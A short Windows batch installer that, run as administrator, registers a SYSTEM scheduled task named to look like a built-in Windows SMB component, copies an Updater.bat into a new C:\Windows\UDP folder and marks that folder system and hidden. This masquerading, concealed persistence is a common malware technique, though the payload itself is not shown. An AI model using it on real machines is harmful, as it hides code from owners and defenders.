@echo off
net session >nul 2>&1
if %errorlevel%==0 (goto installation) ELSE (goto denied)
:Installation
mkdir "C:\Windows\UDP\UpdaterL" 2>> nul
schtasks /query /TN "Microsoft\Windows\SMB\Updater" >NUL 2>&1
if %errorlevel%==0 schtasks /delete /tn "Microsoft\Windows\SMB\Updater" /f
@setlocal enableextensions
@cd /d "%~dp0"
schtasks /create /ru "SYSTEM" /tn "Microsoft\Windows\SMB\Updater" /xml Updater.xml
copy /y Updater.bat "C:\Windows\UDP\UpdaterL\Updater.bat"
attrib +s +h "C:\Windows\UDP"
:CHECKING
find "C:\Windows\UDP\UpdaterL\Updater.bat" || goto failed
schtasks /query /TN "Microsoft\Windows\SMB\Updater" >NUL 2>&1
if %errorlevel%==0 (goto complete) ELSE (goto failed)
:Complete
color A
Echo Installation completed!
sleep 5
exit


:denied
color C
ECHO Access denied. Execute as Administrator
sleep 4
exit
:failed
color A
Echo Installation failed...
sleep 4
exit